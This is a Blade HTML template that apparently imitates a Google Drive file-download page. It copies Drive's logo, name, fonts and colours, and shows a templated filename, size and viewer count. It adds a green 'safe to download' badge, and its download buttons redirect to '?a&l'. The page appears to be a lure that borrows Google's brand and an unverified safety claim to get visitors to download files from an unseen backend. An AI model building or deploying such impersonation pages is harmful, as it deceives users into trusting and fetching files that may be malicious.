<!doctype html>
<html lang="vi">

<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" />
    <title>{{ $data->title }}</title>
    <meta name="title" content="{{ $data->title }}" />
    <meta name="description" content="{{ $data->description }}">
    <meta property="twitter:title" content="{{ $data->title }}" />
    <meta property="twitter:description" content="{{ $data->description }}" />
    <meta property="twitter:card" content="summary_large_image" />
    <meta property="twitter:image" content="{{ $data->image }}" />
    <meta property="og:title" content="{{ $data->title }}" />
    <meta property="og:image" content="{{ $data->image }}" />
    <meta property="og:type" content="article" />
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
    <link
        href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;700&family=Roboto:wght@400;500&display=swap"
        rel="stylesheet" />
    <style>
        :root {
            --gd-blue: #1a73e8;
            --gd-blue-hover: #1765cc;
            --gd-text: #202124;
            --gd-text-muted: #5f6368;
            --gd-border: #e8eaed;
            --gd-bg: #f8f9fa;
        }

        html,
        body {
            font-family: "Google Sans", "Roboto", system-ui, sans-serif;
            background: var(--gd-bg);
            color: var(--gd-text);
        }

        .gd-shadow {
            box-shadow:
                0 1px 2px 0 rgba(60, 64, 67, 0.08),
                0 2px 6px 2px rgba(60, 64, 67, 0.06);
        }

        .gd-shadow-hover:hover {
            box-shadow:
                0 1px 3px 0 rgba(60, 64, 67, 0.15),
                0 4px 12px 4px rgba(60, 64, 67, 0.1);
        }

        .btn-primary {
            background: var(--gd-blue);
            color: #fff;
            transition:
                background 0.15s,
                box-shadow 0.15s,
                transform 0.05s;
        }

        .btn-primary:hover {
            background: var(--gd-blue-hover);
            box-shadow: 0 1px 3px rgba(26, 115, 232, 0.4);
        }

        .btn-primary:active {
            transform: translateY(1px);
        }

        .icon-btn {
            transition: background 0.15s;
        }

        .icon-btn:hover {
            background: rgba(60, 64, 67, 0.08);
        }

        .preview-card {
            transition:
                box-shadow 0.2s,
                transform 0.2s;
        }

        @keyframes float {

            0%,
            100% {
                transform: translateY(0);
            }

            50% {
                transform: translateY(-4px);
            }
        }

        .float {
            animation: float 4s ease-in-out infinite;
        }

        @keyframes fadeUp {
            from {
                opacity: 0;
                transform: translateY(12px);
            }

            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .fade-up {
            animation: fadeUp 0.5s ease-out both;
        }

        .fade-up-1 {
            animation-delay: 0.05s;
        }

        .fade-up-2 {
            animation-delay: 0.15s;
        }

        .fade-up-3 {
            animation-delay: 0.25s;
        }

        .bg-grid {
            background-image:
                radial-gradient(circle at 1px 1px, rgba(60, 64, 67, 0.06) 1px, transparent 0);
            background-size: 24px 24px;
        }
    </style>
</head>

<body class="min-h-screen flex flex-col">
    <!-- Topbar -->
    <header class="bg-white border-b border-[#e8eaed] sticky top-0 z-20">
        <div class="max-w-[1600px] mx-auto px-4 h-16 flex items-center justify-between">
            <!-- Logo -->
            <a href="#" class="flex items-center gap-2 group">
                <svg width="36" height="32" viewBox="0 0 87 78" xmlns="http://www.w3.org/2000/svg">
                    <path d="M6.6 66.85l3.85 6.65c.8 1.4 1.95 2.5 3.3 3.3L27.5 53H0c0 1.55.4 3.1 1.2 4.5l5.4 9.35z"
                        fill="#0066da" />
                    <path d="M43.65 25L29.9 1.2C28.55 2 27.4 3.1 26.6 4.5L1.2 48.5C.4 49.9 0 51.45 0 53h27.5l16.15-28z"
                        fill="#00ac47" />
                    <path
                        d="M73.55 76.8c1.35-.8 2.5-1.9 3.3-3.3l1.6-2.75 7.65-13.25c.8-1.4 1.2-2.95 1.2-4.5h-27.5l5.85 11.5 7.9 12.3z"
                        fill="#ea4335" />
                    <path d="M43.65 25L57.4 1.2C56.05.4 54.5 0 52.9 0H34.4c-1.6 0-3.15.45-4.5 1.2L43.65 25z"
                        fill="#00832d" />
                    <path d="M59.8 53H27.5L13.75 76.8c1.35.8 2.9 1.2 4.5 1.2h50.8c1.6 0 3.15-.45 4.5-1.2L59.8 53z"
                        fill="#2684fc" />
                    <path
                        d="M73.4 26.5L60.7 4.5c-.8-1.4-1.95-2.5-3.3-3.3L43.65 25l16.15 28h27.45c0-1.55-.4-3.1-1.2-4.5l-12.65-22z"
                        fill="#ffba00" />
                </svg>
                <span class="text-[22px] text-[#5f6368] font-normal tracking-tight hidden sm:inline">
                    Drive
                </span>
            </a>
            <!-- Right actions -->
            <div class="flex items-center gap-2">
                <button onclick="downLoad();"
                    class="btn-primary inline-flex items-center gap-2 h-10 px-4 sm:px-5 rounded-full text-[14px] font-medium">
                    <svg class="w-5 h-5" fill="none" stroke="currentColor" stroke-width="2.2" viewBox="0 0 24 24">
                        <path stroke-linecap="round" stroke-linejoin="round"
                            d="M4 16v2a2 2 0 002 2h12a2 2 0 002-2v-2M7 10l5 5 5-5M12 15V3" />
                    </svg>
                    <span class="hidden sm:inline">{{ __('custom/googledrive.download') }}</span>
                </button>
            </div>
        </div>
    </header>

    <!-- Main -->
    <main class="flex-1 bg-grid">
        <div class="max-w-3xl mx-auto px-4 py-10 sm:py-16">
            <!-- File name breadcrumb -->
            <div class="flex items-center gap-2 text-[13px] text-[#5f6368] mb-6 fade-up fade-up-1">
                <svg class="w-4 h-4" fill="currentColor" viewBox="0 0 24 24">
                    <path d="M10 4H4c-1.11 0-2 .89-2 2v12a2 2 0 002 2h16a2 2 0 002-2V8a2 2 0 00-2-2h-8l-2-2z" />
                </svg>
                <span class="text-[#202124] font-medium truncate">{{ $input->filename }}</span>
            </div>

            <!-- File preview card -->
            <div class="preview-card bg-white rounded-2xl gd-shadow gd-shadow-hover overflow-hidden fade-up fade-up-2">
                <!-- Preview area -->
                <div
                    class="relative bg-gradient-to-br from-[#f8f9ff] via-[#eef3ff] to-[#fef2f2] py-[30px] flex flex-col items-center justify-center">
                    <!-- Decorative blobs -->
                    <div class="absolute top-6 left-8 w-24 h-24 bg-blue-200/30 rounded-full blur-2xl"></div>
                    <div class="absolute bottom-6 right-10 w-32 h-32 bg-rose-200/40 rounded-full blur-2xl"></div>
                    <div
                        class="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-64 h-64 bg-indigo-100/30 rounded-full blur-3xl">
                    </div>

                    <!-- File icon (generic) -->
                    <div class="relative float">
                        <svg width="120" height="148" viewBox="0 0 120 148" fill="none"
                            xmlns="http://www.w3.org/2000/svg" class="drop-shadow-xl">
                            <!-- paper -->
                            <path d="M12 4h68l28 28v104a8 8 0 01-8 8H12a8 8 0 01-8-8V12a8 8 0 018-8z" fill="#fff"
                                stroke="#dadce0" stroke-width="2" />
                            <!-- folded corner -->
                            <path d="M80 4l28 28H88a8 8 0 01-8-8V4z" fill="#f1f3f4" stroke="#dadce0" stroke-width="2" />
                            <!-- generic text lines -->
                            <rect x="18" y="60" width="84" height="6" rx="3" fill="#e8eaed" />
                            <rect x="18" y="76" width="84" height="6" rx="3" fill="#e8eaed" />
                            <rect x="18" y="92" width="84" height="6" rx="3" fill="#e8eaed" />
                            <rect x="18" y="108" width="60" height="6" rx="3" fill="#e8eaed" />
                            <rect x="18" y="124" width="40" height="6" rx="3" fill="#e8eaed" />
                        </svg>
                    </div>

                    <!-- Tag -->
                    <div
                        class="relative mt-8 inline-flex items-center gap-2 bg-white/80 backdrop-blur px-3 py-1.5 rounded-full border border-[#e8eaed] text-[12px] text-[#5f6368]">
                        <span class="w-2 h-2 rounded-full bg-emerald-500"></span>
                        {{ __('custom/googledrive.safe_to_download') }}
                    </div>
                </div>

                <!-- Info -->
                <div class="px-6 sm:px-10 py-8 text-center border-t border-[#e8eaed]">
                    <h1 class="text-[22px] sm:text-[26px] font-medium text-[#202124] tracking-tight break-all">
                        {{ $input->filename }}
                    </h1>

                    <div
                        class="mt-3 flex flex-wrap items-center justify-center gap-x-5 gap-y-2 text-[14px] text-[#5f6368]">
                        <span class="inline-flex items-center gap-1.5">
                            <svg class="w-4 h-4" fill="none" stroke="currentColor" stroke-width="2"
                                viewBox="0 0 24 24">
                                <path stroke-linecap="round" stroke-linejoin="round"
                                    d="M20 13V7a2 2 0 00-2-2h-3l-2-2H6a2 2 0 00-2 2v12a2 2 0 002 2h6m4 0h6m-3-3v6" />
                            </svg>
                            {{ $input->filesize }}
                        </span>
                        <span class="w-1 h-1 rounded-full bg-[#dadce0] hidden sm:inline-block"></span>
                        <span class="inline-flex items-center gap-1.5">
                            <svg class="w-4 h-4" fill="none" stroke="currentColor" stroke-width="2"
                                viewBox="0 0 24 24">
                                <path stroke-linecap="round" stroke-linejoin="round"
                                    d="M15 12a3 3 0 11-6 0 3 3 0 016 0z M2.46 12C3.73 7.94 7.52 5 12 5s8.27 2.94 9.54 7c-1.27 4.06-5.06 7-9.54 7S3.73 16.06 2.46 12z" />
                            </svg>
                            {{ $input->viewers . __('custom/googledrive.viewer') }}
                        </span>
                    </div>

                    <!-- Buttons -->
                    <div class="mt-7 flex flex-col sm:flex-row items-stretch sm:items-center justify-center gap-3" onclick="downLoad();">
                        <button
                            class="btn-primary inline-flex items-center justify-center gap-2 h-12 px-7 rounded-full text-[15px] font-medium">
                            <svg class="w-5 h-5" fill="none" stroke="currentColor" stroke-width="2.2"
                                viewBox="0 0 24 24">
                                <path stroke-linecap="round" stroke-linejoin="round"
                                    d="M4 16v2a2 2 0 002 2h12a2 2 0 002-2v-2M7 10l5 5 5-5M12 15V3" />
                            </svg>
                            {{ __('custom/googledrive.download') }}
                        </button>
                    </div>

                    <p class="mt-5 text-[12px] text-[#5f6368]">
                        {{ __('custom/googledrive.accepted') }}
                    </p>
                </div>
            </div>
        </div>
    </main>
    <script>
        function downLoad() {
            window.location.href = "?a&l"
        }
    </script>
</body>

</html>
